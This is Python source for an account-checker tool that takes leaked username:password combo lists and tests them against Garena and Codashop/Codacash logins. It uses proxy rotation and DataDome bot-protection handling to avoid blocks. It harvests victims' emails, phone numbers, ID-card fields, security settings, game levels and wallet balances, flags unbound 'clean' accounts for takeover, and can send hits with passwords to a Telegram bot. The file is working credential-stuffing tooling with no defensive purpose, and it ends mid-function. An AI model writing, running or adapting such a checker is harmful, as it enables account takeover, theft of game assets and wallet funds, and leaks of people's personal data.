            'nickname': 'N/A',
            'email': account_details,
            'personal': {
                'mobile_no': 'N/A',
                'country': 'N/A',
                'id_card': 'N/A'
            },
            'bind_status': 'N/A',
            'security_status': 'N/A',
            'profile': {
                'shell_balance': 'N/A'
            },
            'status': {
                'account_status': 'N/A'
            },
            'game_info': []
        }

    display_text = (
        f"Login: {account_details.get('username', 'N/A')}\n"
        f"    -> Garena Shell: {account_details['profile'].get('shell_balance', 'N/A')}\n"
        f"    -> Email: {account_details.get('email', 'N/A')}\n"
        f"    -> Mobile: {account_details['personal'].get('mobile_no', 'N/A')}\n"
        f"    -> Country: {account_details['personal'].get('country', 'N/A')}\n"
        f"    -> Facebook Info: {account_details.get('nickname', 'N/A')}\n"
        f"    -> Security:\n"
        f"        - Bind Status: {account_details.get('bind_status', 'N/A')}\n"
        f"        - Security Status: {account_details.get('security_status', 'N/A')}\n"
        f"        - Account Status: {account_details['status'].get('account_status', 'N/A')}\n"
        f"    -> CODM Info:\n"
        f"        - Nickname: {codm_info.get('codm_nickname', 'N/A')}\n"
        f"        - Level: {codm_info.get('codm_level', 'N/A')}\n"
        f"        - Region: {codm_info.get('region', 'N/A')}\n"
        f"        - UID: {codm_info.get('uid', 'N/A')}\n"
        f"        - Checked By @LEGIThea"
    )

    return display_text

def save_codm_account(account, password, codm_info, country='N/A'):
    try:
        if not codm_info:
            return
            
        codm_level = int(codm_info.get('codm_level', 0))
        region = codm_info.get('region', 'N/A').upper()
        nickname = codm_info.get('codm_nickname', 'N/A')
        
        if isinstance(country, dict):
            country_code = country.get('country', 'N/A').upper() if country.get('country') else region
        else:
            country_code = country.upper() if country and country != 'N/A' else region
            
        if country_code == 'N/A':
            country_code = 'UNKNOWN'

        if codm_level <= 50:
            level_range = "1-50"
        elif codm_level <= 100:
            level_range = "51-100"
        elif codm_level <= 150:
            level_range = "101-150"
        elif codm_level <= 200:
            level_range = "151-200"
        elif codm_level <= 250:
            level_range = "201-250"
        elif codm_level <= 300:
            level_range = "251-300"
        elif codm_level <= 350:
            level_range = "301-350"
        else:
            level_range = "351-400"

        os.makedirs('Results', exist_ok=True)
        level_file = os.path.join('Results', f"{country_code}_{level_range}_accounts.txt")
        
        account_exists = False
        if os.path.exists(level_file):
            with open(level_file, "r", encoding="utf-8") as f:
                existing_content = f.read()
                if account in existing_content:
                    account_exists = True
        
        if not account_exists:
            with open(level_file, "a", encoding="utf-8") as f:
                if account and password:
                    f.write(f"{account}:{password} | Level: {codm_level} | Nickname: {nickname} | Region: {region} | UID: {codm_info.get('uid', 'N/A')}\n")
                    logger.info(f"[SUCCESS] Saved CODM account: {account} (Level {codm_level})")
                else:
                    logger.info(f"[INFO] Skipping CODM save for {account}: missing account or password")
        else:
            logger.info(f"[INFO] CODM account {account} already exists in {level_file}, skipping duplicate\n")
            
    except Exception as e:
        logger.error(f"[ERROR] Error saving CODM account {account}: {e}")


def save_account_details(account, details, codm_info=None, password=None):
    try:
        # ✅ Only save if CODM info exists
        if not codm_info:
            details['is_valid'] = False  # Prevent saving
            return

        os.makedirs('Results', exist_ok=True)
        
        codm_name = codm_info.get('codm_nickname', 'N/A')
        codm_uid = codm_info.get('uid', 'N/A')
        codm_region = codm_info.get('region', 'N/A')
        codm_level = codm_info.get('codm_level', 'N/A')
        shell_balance = details['profile']['shell_balance']
        country = details['personal']['country']

        # Use the improved bind detection from parse_account_details
        bind_status = "Clean" if details['is_clean'] else "Bound"
        bind_details = details['bind_status']

        # Save CODM-related info separately
        save_codm_account(account, password, codm_info, country)
        
        # Save to appropriate file based on bind status
        filename = f"Results/{bind_status.lower()}_accounts.txt"

        with open(filename, 'a', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write(f"Account: {account}\n")
            if password:
                f.write(f"Password: {password}\n")
            f.write(f"UID: {details['uid']}\n")
            f.write(f"Username: {details['username']}\n")
            f.write(f"Nickname: {details['nickname']}\n")
            f.write(f"Email: {details['email']}\n")
            f.write(f"Phone: {details['personal']['mobile_no']}\n")
            f.write(f"Country: {country}\n")
            f.write(f"Shell Balance: {shell_balance}\n")
            f.write(f"Account Status: {details['status']['account_status']}\n")
            f.write(f"Bind Status: {bind_details}\n")
            f.write(f"Security Status: {details['security_status']}\n")
            f.write(f"CODM Name: {codm_name}\n")
            f.write(f"CODM UID: {codm_uid}\n")
            f.write(f"CODM Region: {codm_region}\n")
            f.write(f"CODM Level: {codm_level}\n")
            f.write("=" * 60 + "\n\n")
            
        # Also append to a full combined file
        with open('Results/full_details.txt', 'a', encoding='utf-8') as f_full:
            f_full.write("=" * 60 + "\n")
            f_full.write(f"Account: {account}\n")
            if password:
                f_full.write(f"Password: {password}\n")
            f_full.write(f"UID: {details['uid']}\n")
            f_full.write(f"Username: {details['username']}\n")
            f_full.write(f"Nickname: {details['nickname']}\n")
            f_full.write(f"Email: {details['email']}\n")
            f_full.write(f"Phone: {details['personal']['mobile_no']}\n")
            f_full.write(f"Country: {country}\n")
            f_full.write(f"Shell Balance: {shell_balance}\n")
            f_full.write(f"Account Status: {details['status']['account_status']}\n")
            f_full.write(f"Bind Status: {bind_details}\n")
            f_full.write(f"Security Status: {details['security_status']}\n")
            f_full.write(f"CODM Name: {codm_name}\n")
            f_full.write(f"CODM UID: {codm_uid}\n")
            f_full.write(f"CODM Region: {codm_region}\n")
            f_full.write(f"CODM Level: {codm_level}\n")
            f_full.write("=" * 60 + "\n\n")
            
    except Exception as e:
        logger.error(f"[ERROR] Error saving account details: {e}")

def parse_account_details(data):
    user_info = data.get('user_info', {})

    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),

        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },

        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) and user_info.get('mobile_no', '') else "Not Bound",
            'extra_data': user_info.get('realinfo_extra_data', {})
        },

        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },

        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },

        'binds': [],
        'game_info': []
    }

    email = account_info['email']
    if email != 'N/A' and email and not email.startswith('*') and '@' in email and not email.endswith('@gmail.com') and '**' not in email:
        account_info['binds'].append('Email')

    mobile_no = account_info['personal']['mobile_no']
    if mobile_no != 'N/A' and mobile_no and mobile_no.strip():
        account_info['binds'].append('Phone')

    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')

    id_card = account_info['personal']['id_card']
    if id_card != 'N/A' and id_card and id_card.strip():
        account_info['binds'].append('ID Card')

    account_info['bind_status'] = "Clean" if not account_info['binds'] else f"Bound ({', '.join(account_info['binds'])})"
    account_info['is_clean'] = len(account_info['binds']) == 0 and not account_info['email_verified']

    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append("2FA")
    if account_info['security']['authenticator_app']:
        security_indicators.append("Auth App")
    if account_info['security']['suspicious']:
        security_indicators.append("[WARNING] Suspicious")

    account_info['security_status'] = "[SUCCESS] Normal" if not security_indicators else " | ".join(security_indicators)

    return account_info

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, TG_SETTINGS=None):
    try:
        # ───────────────────────────────
        # DataDome Setup
        # ───────────────────────────────
        datadome_manager.clear_session_datadome(session)

        current_datadome = datadome_manager.get_datadome()
        if current_datadome:
            success = datadome_manager.set_session_datadome(session, current_datadome)
            if not success:
                logger.warning("[WARNING] Failed to set existing DataDome cookie")
        else:
            datadome = get_datadome_cookie(session)
            if not datadome:
                logger.warning("[WARNING] DataDome generation failed, proceeding without it")
            else:
                datadome_manager.set_datadome(datadome)
                datadome_manager.set_session_datadome(session, datadome)

        # ───────────────────────────────
        # Prelogin & Login Phase
        # ───────────────────────────────
        v1, v2, new_datadome = prelogin(session, account, datadome_manager)

        if v1 == "IP_BLOCKED":
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: IP Blocked - New DataDome required"

        if not v1 or not v2:
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: invalid (prelogin failed)"

        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)

        sso_key = login(session, account, password, v1, v2)
        if not sso_key:
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: invalid (login failed)"

        # ───────────────────────────────
        # Fetch Account Info
        # ───────────────────────────────
        headers = {
            'accept': '*/*',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
        }

        current_cookies = session.cookies.get_dict()
        cookie_parts = [f"{k}={v}" for k, v in current_cookies.items() if k in ['apple_state_key', 'datadome', 'sso_key']]
        if cookie_parts:
            headers['cookie'] = '; '.join(cookie_parts)

        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)

        if response.status_code == 403:
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: error_security_ban"

        try:
            account_data = response.json()
        except json.JSONDecodeError:
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: unknown_error"

        # ───────────────────────────────
        # Handle errors in response
        # ───────────────────────────────
        if 'error' in account_data:
            error_type = account_data.get('error', '').lower()
            if any(e in error_type for e in ['error_auth', 'error_no_account', 'error_security_ban', 'unknown_error']):
                live_stats.update_stats(valid=False)
                return f"[ERROR] {account}: {error_type}"
            else:
                live_stats.update_stats(valid=False)
                return f"[ERROR] {account}: unknown_error"

        # ───────────────────────────────
        # Parse Account Details
        # ───────────────────────────────
        if 'user_info' in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({'user_info': account_data})

        has_codm, codm_info = check_codm_account(session, account)

        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)

        save_account_details(account, details, codm_info if has_codm else None, password)

        # Update live stats
        live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm)

        shell_balance = details['profile'].get('shell_balance', '0')

        # ───────────────────────────────
        # Console Log
        # ───────────────────────────────
        result = f"[SUCCESS] {account}: Valid\n"
        if has_codm:
            result += display_codm_info(details, codm_info)

        if details['is_clean']:
            logger.info(f"[CLEAN] {account}: Clean account detected")
        else:
            logger.info(f"[BOUND] {account}: Not clean account (has binds)")

        # ───────────────────────────────
        # Telegram Integration
        # ───────────────────────────────
        if TG_SETTINGS and has_codm and codm_info:
            try:
                codm_level = int(codm_info.get('codm_level', 0))
                clean_only = TG_SETTINGS.get('clean_only', False)
                range_str = TG_SETTINGS.get('level_range', 'ALL')

                # Clean-only filter
                if clean_only and not details['is_clean']:
                    logger.info(f"[SKIP] {account} (Bound, clean-only mode)")
                    return result  # still log but skip Telegram

                # Level range filter
                if range_str != "ALL":
                    low, high = map(int, range_str.split('-'))
                    if not (low <= codm_level <= high):
                        logger.info(f"[SKIP] {account} (Level {codm_level} not in {range_str})")
                        return result  # skip Telegram only

                # Telegram message
                msg = (
                    f"[+] Account: {account}:{password}\n"
                    f"[+] CODM Hit Found\n"
                    f"[+] Nickname: {codm_info.get('codm_nickname', 'N/A')}\n"
                    f"[+] Level: {codm_info.get('codm_level', 'N/A')}\n"
                    f"[+] Region: {codm_info.get('region', 'N/A')}\n"
                    f"[+] UID: {codm_info.get('uid', 'N/A')}\n"
                    f"[+] Username: {account}\n"
                    f"[+] Email: {details.get('email', 'N/A')}\n"
                    f"[+] Country: {details.get('personal', {}).get('country', 'N/A')}\n"
                    f"[+] Bind Status: {'Clean' if details['is_clean'] else 'Bound'}\n"
                    f"[+] Shell Balance: {shell_balance}\n"
                    f"[+] Security: Suspicious\n"
                    f"[+] Status: Active"
                )

                send_to_telegram(TG_SETTINGS['bot_token'], TG_SETTINGS['chat_id'], msg)
                logger.info(f"[TG] Sent to Telegram: {account} (Level {codm_level})")

            except Exception as e:
                logger.error(f"[TG ERROR] Telegram send failed for {account}: {e}")

        return result

    except Exception as e:
        logger.error(f"[ERROR] Unexpected error processing {account}: {e}")
        live_stats.update_stats(valid=False)
        return f"[ERROR] {account}: processing error"

def find_nearest_account_file():
    keywords = ["garena", "account", "codm"]
    combo_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Combo")

    txt_files = []
    for root, _, files in os.walk(combo_folder):
        for file in files:
            if file.endswith(".txt"):
                txt_files.append(os.path.join(root, file))

    for file_path in txt_files:
        if any(keyword in os.path.basename(file_path).lower() for keyword in keywords):
            return file_path

    if txt_files:
        return random.choice(txt_files)

    return os.path.join(combo_folder, "accounts.txt")

def send_to_telegram(bot_token, chat_id, message):
    """Send message to Telegram bot with error handling"""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }

        response = requests.post(url, data=data, timeout=10)

        if response.status_code == 200:
            console.print(f"[green]✅ Telegram Hit Sent Successfully[/green]")
        else:
            console.print(Panel(
                f"⚠️ Telegram Error [{response.status_code}]\n\n{response.text}",
                style="red",
                title="Telegram Send Failed"
            ))

    except requests.exceptions.RequestException as e:
        console.print(Panel(
            f"❌ Network Error while sending to Telegram:\n{e}",
            style="red",
            title="Telegram Connection Error"
        ))


def remove_duplicates_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        unique_lines = []
        seen_lines = set()
        for line in lines:
            stripped_line = line.strip()
            if stripped_line and stripped_line not in seen_lines:
                unique_lines.append(line)
                seen_lines.add(stripped_line)

        if len(lines) == len(unique_lines):
            console.print(f"[yellow][*] No duplicate lines found in {os.path.basename(file_path)}.[/yellow]")
            return False

        with open(file_path, 'w', encoding='utf-8') as f:
            f.writelines(unique_lines)

        console.print(f"[green][+] Removed {len(lines) - len(unique_lines)} duplicate lines from {os.path.basename(file_path)}.[/green]")
        return True
    except Exception as e:
        console.print(f"[red][ERROR] Failed to clean {os.path.basename(file_path)}: {e}[/red]")
        return False
        
def select_input_file():
    combo_folder = os.path.join(os.getcwd(), "Combo")
    os.makedirs(combo_folder, exist_ok=True)

    txt_files = [f for f in os.listdir(combo_folder) if f.endswith(".txt")]
    if not txt_files:
        console.print(Panel("No .txt files found in Combo folder!", style="red", title="Error"))
        exit(0)

    
    table = "\n".join([f"[cyan]{i+1}.[/cyan] {f}" for i, f in enumerate(txt_files)])
    console.print(Panel(table, title="Available Combo Files ───────────────[FIXED] @findmebro20", style="blue"))

    
    selected = console.input("\nSelect file number or press Enter for auto-select: ").strip()
    if selected.isdigit() and 1 <= int(selected) <= len(txt_files):
        file_path = os.path.join(combo_folder, txt_files[int(selected)-1])
    else:
        file_path = os.path.join(combo_folder, txt_files[0])
        console.print(Panel(f"Auto-selected: [green]{os.path.basename(file_path)}[/green]", style="green", title="Auto"))

    
    auto_remove_choice = console.input("\nAuto Remove Checked Lines (y/N): ").strip().lower()
    AUTO_REMOVE_CHECKED = auto_remove_choice == "y"

    
    tg_choice = console.input("\nSave TG Bot Hits (y/N): ").strip().lower()
    TG_SETTINGS = None

    if tg_choice == "y":
        TG_SETTINGS = {}
        TG_SETTINGS["bot_token"] = console.input("Enter BOT_TOKEN: ").strip()
        TG_SETTINGS["chat_id"] = console.input("Enter CHAT_ID: ").strip()

        clean_choice = console.input("Clean or NotClean [c/n]: ").strip().lower()
        TG_SETTINGS["clean_only"] = (clean_choice == "c")

        console.print("\nSelect Level Range to Send Hits:")
        console.print("[1] 1-50\n[2] 50-100\n[3] 100-200\n[4] 200-300\n[5] 300-400\n[6] ALL LEVELS")

        range_choice = console.input("Enter Number: ").strip()
        ranges = {
            "1": "1-50",
            "2": "50-100",
            "3": "100-200",
            "4": "200-300",
            "5": "300-400",
            "6": "ALL"
        }
        TG_SETTINGS["level_range"] = ranges.get(range_choice, "ALL")

        console.print(Panel(
            f"✅ Telegram Save Enabled\n"
            f"Bot Token: [cyan]{TG_SETTINGS['bot_token']}[/cyan]\n"
            f"Chat ID: [cyan]{TG_SETTINGS['chat_id']}[/cyan]\n"
            f"Clean Only: {'Yes' if TG_SETTINGS['clean_only'] else 'No'}\n"
            f"Level Range: {TG_SETTINGS['level_range']}",
            style="green",
            title="Telegram Save Setup ───────────────[FIXED] @findmebro20"
        ))

    return file_path, AUTO_REMOVE_CHECKED, TG_SETTINGS


import os
import cloudscraper
from rich.console import Console
from rich.panel import Panel
from rich.box import DOUBLE
import logging

console = Console()
logger = logging.getLogger(__name__)

def main():
    # 🟡 Select input file + Auto Remove feature + Telegram settings
    filename, AUTO_REMOVE_CHECKED, TG_SETTINGS = select_input_file()
    
    if not os.path.exists(filename):
        console.print(Panel(f"File not found: {filename}", style="red", title="Error"))
        return
    
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    
    session = cloudscraper.create_scraper()
    
    # Cookie initialization
    initial_cookie = cookie_manager.get_valid_cookie()
    console.print()  # <-- spacing
    if initial_cookie:
        console.print(Panel(
            "Using saved cookie",
            style="green",
            title="Session ────────────────────────────────────────────────────[FIXED] @findmebro20"
        ))
        applyck(session, initial_cookie)
    else:
        console.print(Panel(
            "Starting fresh session",
            style="yellow",
            title="Session ────────────────────────────────────────────────────[FIXED] @findmebro20"
        ))
        datadome = get_datadome_cookie(session)
        if datadome:
            datadome_manager.set_datadome(datadome)
            console.print()
            console.print(Panel(
                "Generated DataDome cookie",
                style="green",
                title="Security ─────────────────────────────────────────────────[FIXED] @findmebro20"
            ))
    
    # Load accounts
    accounts = []
    encodings = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
    
    for encoding in encodings:
        try:
            with open(filename, 'r', encoding=encoding) as file:
                accounts = [line.strip() for line in file if line.strip()]
            console.print()
            console.print(Panel(
                f"Loaded [green]{len(accounts):,}[/green] accounts using {encoding} encoding",
                style="blue",
                title="File Loaded ────────────────────────────────────────────────[FIXED] @findmebro20"
            ))
            break
        except UnicodeDecodeError:
            continue
    
    if not accounts:
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
                accounts = [line.strip() for line in file if line.strip()]
            console.print()
            console.print(Panel(
                f"Loaded [green]{len(accounts):,}[/green] accounts (with error handling)",
                style="blue",
                title="File Loaded ────────────────────────────────────────────────[FIXED] @findmebro20"
            ))
        except Exception as e:
            console.print(Panel(f"Failed to read file: {e}", style="red", title="Error"))
            return
    
    if not accounts:
        console.print(Panel("No valid accounts found in file", style="red", title="Error"))
        return
    
    # Start processing
    total_accounts = len(accounts)
    console.print()
    console.print(Panel(
        f"Starting processing of [cyan]{total_accounts:,}[/cyan] accounts",
        style="bold blue",
        title="Processing Started ─────────────────────────────────────────[FIXED] @findmebro20"
    ))

    # Process accounts
    for i, account_line in enumerate(accounts, 1):
        if ':' not in account_line:
            logger.warning(f"Skipping invalid line: {account_line}")
            continue
            
        try:
            account, password = account_line.split(':', 1)
            account, password = account.strip(), password.strip()
            
            # 🟡 Numeric Counter
            console.print()
            console.print(f"[yellow]Processing account ({i}/{total_accounts})[/yellow]")
            logger.info(f"[{i}/{total_accounts}] Checking: {account}")
            
            # 🧩 Run account check
            result = processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, TG_SETTINGS)
            logger.info(result)
            
            # 🟩 Progress Bar
            bar_length = 40
            progress = i / total_accounts
            filled = int(bar_length * progress)
            empty = bar_length - filled
            bar = f"[green]{'█' * filled}[/green][white]{'░' * empty}[/white]"
            percent = f"{progress * 100:5.1f}%"
            
            stats = live_stats.get_stats()
            console.print()
            live_stats_panel = Panel(
                f"{bar} {percent}\n"
                f"Valid: [green]{stats['valid']}[/green] | "
                f"Invalid: [red]{stats['invalid']}[/red] | "
                f"Clean: [blue]{stats['clean']}[/blue] | "
                f"Not Clean: [yellow]{stats['not_clean']}[/yellow] | "
                f"CODM: [cyan]{stats['has_codm']}[/cyan]",
                style="cyan",
                title="Live Statistics ────────────────────────────────────────────────[FIXED] @findmebro20"
            )
            console.print(live_stats_panel)
            console.print()
            
            # Example of printing CODM info (only if result contains data)
            if isinstance(result, dict) and 'codm_info' in result:
                console.print(display_codm_info(result['account_details'], result['codm_info']))
                console.print()  # space after each account block
            
            # 🧹 Auto Remove Checked Lines
            if AUTO_REMOVE_CHECKED:
                try:
                    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
                        remain = [ln for ln in f if ln.strip() != account_line.strip()]
                    with open(filename, "w", encoding="utf-8") as f:
                        for r in remain:
                            f.write(r if r.endswith("\n") else r + "\n")
                except Exception as e:
                    logger.error(f"Auto-remove failed: {e}")

        except Exception as e:
            logger.error(f"Error processing account: {e}")
            continue
    
    # Final stats panel
    console.print()
    final_stats = live_stats.get_stats()
    final_panel = Panel(
        f"Valid: [green]{final_stats['valid']}[/green]\n"
        f"Invalid: [red]{final_stats['invalid']}[/red]\n"
        f"Clean: [blue]{final_stats['clean']}[/blue]\n"
        f"Not Clean: [yellow]{final_stats['not_clean']}[/yellow]\n"
        f"Has CODM: [cyan]{final_stats['has_codm']}[/cyan]\n"
        f"No CODM: [magenta]{final_stats['no_codm']}[/magenta]",
        style="bold green",
        title="Final Results ─────────────────────────────────────────────────[FIXED] @findmebro20",
        box=DOUBLE
    )
    console.print(final_panel)
    console.print()
        
class CodashopChecker:
    def __init__(self):
        self.hits = 0
        self.fails = 0
        self.banned = 0
        self.retries = 0
        self.proxies = []
        self.cooldown_time = 90

        # Main folder
        self.Codashop_folder = 'results'
        
        # Subfolders
        self.folders = [
            self.Codashop_folder,
            f'{self.Codashop_folder}/hits',
            f'{self.Codashop_folder}/fails',
            f'{self.Codashop_folder}/banned',
            f'{self.Codashop_folder}/countries',
            f'{self.Codashop_folder}/no_wallet_info',
            f'{self.Codashop_folder}/sorted'
        ]
        for folder in self.folders:
            os.makedirs(folder, exist_ok=True)

        self.time_now = datetime.now().strftime("%d-%m-%Y_%H-%M-%S")
        self.hits_file = f'{self.Codashop_folder}/hits/hits_{self.time_now}.txt'
        self.fails_file = f'{self.Codashop_folder}/fails/fails_{self.time_now}.txt'
        self.banned_file = f'{self.Codashop_folder}/banned/banned_{self.time_now}.txt'
        self.no_wallet_info_file = f'{self.Codashop_folder}/no_wallet_info/no_wallet_info_{self.time_now}.txt'

    
    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_logo(self):
        self.clear()
        logo = f"""
{Fore.CYAN}
███████╗███████╗███╗   ██╗██╗██╗  ██╗
╚══███╔╝██╔════╝████╗  ██║██║╚██╗██╔╝
  ███╔╝ █████╗  ██╔██╗ ██║██║ ╚███╔╝ 
 ███╔╝  ██╔══╝  ██║╚██╗██║██║ ██╔██╗ 
███████╗███████╗██║ ╚████║██║██╔╝ ██╗
╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
{Style.RESET_ALL}
{Fore.YELLOW}Current Status:
• Hits: {Fore.GREEN}{self.hits}{Fore.YELLOW}
• Fails: {Fore.RED}{self.fails}{Fore.YELLOW}
• Banned: {Fore.YELLOW}{self.banned}{Fore.YELLOW}
• Retries: {Fore.CYAN}{self.retries}{Fore.YELLOW}
• Cooldown: {self.cooldown_time}s
{Style.RESET_ALL}
"""
        print(logo)

    def detect_proxy_type(self, proxy):
        if ":" in proxy:
            parts = proxy.split(":")
            if len(parts) == 2:
                return "http"
            elif len(parts) == 4:
                return "http"
        return "http"

    def format_proxy(self, proxy):
        proxy_type = self.detect_proxy_type(proxy)
        parts = proxy.split(":")
        if len(parts) == 2:
            ip, port = parts
            return {
                "http": f"{proxy_type}://{ip}:{port}",
                "https": f"{proxy_type}://{ip}:{port}",
            }
        elif len(parts) == 4:
            ip, port, user, password = parts
            return {
                "http": f"{proxy_type}://{user}:{password}@{ip}:{port}",
                "https": f"{proxy_type}://{user}:{password}@{ip}:{port}",
            }
        return None

    def get_proxy(self):
        if not self.proxies:
            return None
        return self.format_proxy(random.choice(self.proxies))

    def load_proxies(self):
        while True:
            proxy_file = input(f"{Fore.YELLOW}[+] Enter proxy file path: {Style.RESET_ALL}")
            if os.path.exists(proxy_file):
                with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                print(f"{Fore.GREEN}[+] Loaded {len(self.proxies)} proxies{Style.RESET_ALL}")
                return
            else:
                print(f"{Fore.RED}[-] File not found! Try again.{Style.RESET_ALL}")

    def validate_proxies(self):
        print(f"\n{Fore.CYAN}[+] Validating proxies...{Style.RESET_ALL}")
        valid_proxies = []
        for proxy in self.proxies:
            try:
                proxy_dict = self.format_proxy(proxy)
                response = requests.get("https://wallet-api.codacash.com/", proxies=proxy_dict, timeout=10)
                if response.status_code < 500:
                    valid_proxies.append(proxy)
                    print(f"{Fore.GREEN}[+] Valid: {proxy}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[-] Invalid: {proxy}{Style.RESET_ALL}")
            except:
                print(f"{Fore.RED}[-] Invalid: {proxy}{Style.RESET_ALL}")

        self.proxies = valid_proxies
        print(f"\n{Fore.GREEN}[+] Valid proxies: {len(valid_proxies)}{Style.RESET_ALL}")

    def load_combos(self):
        while True:
            combo_file = input(f"{Fore.YELLOW}[+] Enter combo file path: {Style.RESET_ALL}")
            if os.path.exists(combo_file):
                with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                return [line.strip() for line in lines if ':' in line]
            else:
                print(f"{Fore.RED}[-] File not found! Try again.{Style.RESET_ALL}")

    
    def save_hit(self, combo, info=""):
        with open(self.hits_file, 'a', encoding='utf-8') as f:
            f.write(combo + " | " + info + '\n')

    def save_fail(self, combo):
        with open(self.fails_file, 'a', encoding='utf-8') as f:
            f.write(combo + '\n')

    def save_banned(self, combo):
        with open(self.banned_file, 'a', encoding='utf-8') as f:
            f.write(combo + '\n')

    def save_no_wallet_info(self, combo):
        with open(self.no_wallet_info_file, 'a', encoding='utf-8') as f:
            f.write(combo + '\n')

    def format_date(self, date_str):
        try:
            dt = datetime.strptime(date_str, "%Y-%m-%dT%H:%M:%S.%fZ")
        except ValueError:
            try:
                dt = datetime.strptime(date_str, "%Y-%m-%dT%H:%M:%SZ")
            except ValueError:
                return date_str
        return dt.strftime("%m/%d/%Y %I:%M:%S %p")

    def get_country(self, currency_code):
        country_map = {
            '608': 'Philippines (PH)',
            '360': 'Indonesia (ID)',
            '702': 'Singapore (SG)',
            '458': 'Malaysia (MY)',
            '764': 'Thailand (TH)',
            '704': 'Vietnam (VN)',
            '116': 'Cambodia (KH)',
            '418': 'Laos (LA)',
            '104': 'Myanmar (MM)',
            '096': 'Brunei (BN)',
            '410': 'South Korea (KR)',
            '792': 'Turkey (TR)',
            '826': 'United Kingdom (GB)',
            '986': 'Brazil (BR)'
        }
        return country_map.get(str(currency_code), str(currency_code))


    def check_account(self, combo):
        try:
            username, password = combo.split(':')
            auth_url = "https://cognito-idp.ap-southeast-1.amazonaws.com/"
            auth_headers = {
                "User-Agent": "Mozilla/5.0",
                "x-amz-target": "AWSCognitoIdentityProviderService.InitiateAuth",
                "x-amz-user-agent": "aws-amplify/0.1.x js",
                "Content-Type": "application/x-amz-json-1.1"
            }
            auth_payload = {
                "AuthFlow": "USER_PASSWORD_AUTH",
                "ClientId": "437f3u0sfh7h0av5rlrrjdtmsb",
                "AuthParameters": {"USERNAME": username, "PASSWORD": password},
                "ClientMetadata": {"country_code": "ph", "country_name": "Philippines", "lang_code": "en"}
            }

            proxy = self.get_proxy()
            try:
                auth_response = requests.post(auth_url, headers=auth_headers, json=auth_payload, proxies=proxy, timeout=10)
            except requests.exceptions.RequestException:
                self.retries += 1
                print(f"{Fore.RED}[!] ERROR: {combo} | Proxy or network issue{Style.RESET_ALL}")
                return

            if '"TokenType":"Bearer"' in auth_response.text:
                auth_data = json.loads(auth_response.text)
                id_token = auth_data['AuthenticationResult']['IdToken']

                wallet_url = "https://wallet-api.codacash.com/user/wallet"
                wallet_headers = {"Authorization": id_token, "x-country-code": "608"}
                wallet_response = requests.get(wallet_url, headers=wallet_headers, proxies=proxy, timeout=10)
                wallet_data = json.loads(wallet_response.text)

                if wallet_data.get('resultCode') == 0:
                    wallet_info = wallet_data['data']
                    balance = float(wallet_info.get('balanceAmount', 0))
                    hit_info = (
                        f"Country = {self.get_country(wallet_info['currencyCode'])} | "
                        f"Mobile = {wallet_info['mobile']} | "
                        f"Balance = {balance:.2f} | "
                        f"Total Spent = {wallet_info['totalSpent']} | "
                        f"Currency = {wallet_info['currencyCode']} | "
                        f"Created On = {self.format_date(wallet_info.get('createdOn', 'N/A'))} | "
                        f"Last Update = {self.format_date(wallet_info.get('lastUpdatedOn', 'N/A'))}"
                    )
                    self.hits += 1
